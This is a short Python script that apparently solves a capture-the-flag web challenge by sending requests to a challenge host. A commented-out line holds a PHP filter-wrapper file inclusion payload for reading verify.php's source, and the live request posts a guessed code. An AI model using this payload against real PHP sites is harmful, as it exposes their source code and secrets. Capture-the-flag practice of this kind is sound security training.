import requests

url = "http://chall1.lagncra.sh:18631"

# res = requests.get(f"{url}/index.php", params={
#     'lang': 'php://filter/convert.base64-encode/resource=verify.php'
# })

# print(res.text)

res = requests.post(f'{url}/verify.php', data={
    'code': 'FLAG_0000_1111_2222'
})

print(res.text)